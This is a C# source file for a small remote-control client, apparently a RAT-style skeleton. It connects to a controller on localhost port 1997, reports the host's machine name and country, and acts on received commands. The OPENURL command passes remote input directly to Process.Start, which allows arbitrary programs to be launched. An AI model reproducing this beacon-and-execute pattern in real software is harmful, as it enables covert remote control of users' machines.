using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Globalization;
using System.Windows.Forms;

namespace client
{
    class Program
    {
        static ClientSettings cs;
        static string RemoteIP = "127.0.0.1";
        static int RemotePort = int.Parse("1997");
        static void Main(string[] args)
        {
            cs = new ClientSettings();
            Thread startConnect = new Thread(Connect);
            startConnect.Start();
            Process.GetCurrentProcess().WaitForExit();
        }

        static void Connect()
        {
            cs.Connect(RemoteIP, RemotePort);
            cs.Send("CONNECTION|" + GetCountry() + "|" + Environment.MachineName);
            cs.Received += new ClientSettings.ReceivedEventHandler(cs_Received);
            cs.Disconnected += new ClientSettings.DisconnectedEventHandler(cs_Disconnected);
        }

        static void cs_Disconnected(ClientSettings cs)
        {
            cs.Close();
        }

        static void cs_Received(ClientSettings cs, string received)
        {
            string[] cmd = received.Split('|');
            switch (cmd[0])
            {
                case "MSGBOX":
                    cs.Send("STATUS|Received message - " + cmd[1]);
                    MessageBox.Show(cmd[1], "");
                    break;
                case "OPENURL":
                    OpenURL(cmd[1]);
                    break;
                case "DISCONNECT":
                    cs.Close();
                    Environment.Exit(0);
                    break;
            }
        }

        static void OpenURL(string url)
        {
            try
            {
                cs.Send("STATUS|URL opened - " + url);
                Process.Start(@url);
            }
            catch
            {
                cs.Send("STATUS|Invalid link!");
            }
        }

        static string GetCountry()
        {
            string culture = CultureInfo.CurrentCulture.EnglishName;
            string country = culture.Substring(culture.IndexOf('(') + 1, culture.LastIndexOf(')') - culture.IndexOf('(') - 1);
            return country;
        }
    }
}
